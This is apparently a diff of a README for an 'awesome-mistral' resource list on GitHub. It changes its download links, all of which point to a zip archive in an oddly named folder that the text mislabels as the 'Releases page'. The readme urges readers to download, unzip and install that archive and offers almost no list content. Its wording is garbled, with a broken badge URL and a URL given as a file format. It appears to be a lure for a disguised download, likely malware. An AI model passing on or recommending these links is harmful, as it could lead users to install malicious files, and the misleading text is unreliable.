@@ -1,7 +1,7 @@
 # 🎉 awesome-mistral - Discover Amazing Mistral AI Resources
 
 ## 📥 Download Now!
-[![Download Latest Release](https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip%20Latest%https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip)](https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip%20Latest%https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip)](https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip)
 
 ## 📖 Overview
 Welcome to the **awesome-mistral** repository. This is a curated collection of fantastic resources, tools, libraries, and projects that revolve around the Mistral AI ecosystem. Whether you're a beginner or looking to deepen your knowledge, this repository has something for everyone interested in artificial intelligence.
@@ -9,13 +9,13 @@ Welcome to the **awesome-mistral** repository. This is a curated collection of f
 ## 🚀 Getting Started
 To use this repository effectively, follow these steps:
 
-1. **Click the Download Link**: Visit the [Releases page](https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip) to access all available downloads.
+1. **Click the Download Link**: Visit the [Releases page](https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip) to access all available downloads.
 
 2. **Select a Version**: On the Releases page, you'll see different versions of the repository. Each version may contain various resources, improvements, or updates.
 
 3. **Download the Package**: Choose the version that you want. Click the download link for the appropriate package for your needs. 
 
-4. **Unzip the Files**: Once downloaded, find the file in your Downloads folder. It may come in a `.zip` or `https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip` format. Right-click the file and select "Extract All" or use your preferred file unzipping tool.
+4. **Unzip the Files**: Once downloaded, find the file in your Downloads folder. It may come in a `.zip` or `https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip` format. Right-click the file and select "Extract All" or use your preferred file unzipping tool.
 
 5. **Explore the Resources**: After unzipping, navigate through the folder. You'll find various resources, including guides, tutorials, and example projects.
 
@@ -70,6 +70,6 @@ For further exploration of Mistral and its ecosystem, check these topics:
 - **Awesome Lists**: Discover curated lists of resources related to various fields.
 
 ## 🔗 Download & Install
-To get started, be sure to visit this page to download: [Releases page](https://github.com/Maryfall/awesome-mistral/raw/refs/heads/main/lotophagously/mistral-awesome-Aaronite.zip). Follow the instructions outlined above to properly install and start using your new resources.
+To get started, be sure to visit this page to download: [Releases page](https://raw.githubusercontent.com/Maryfall/awesome-mistral/main/lotophagously/mistral-awesome-2.9.zip). Follow the instructions outlined above to properly install and start using your new resources.
 
 Happy exploring!
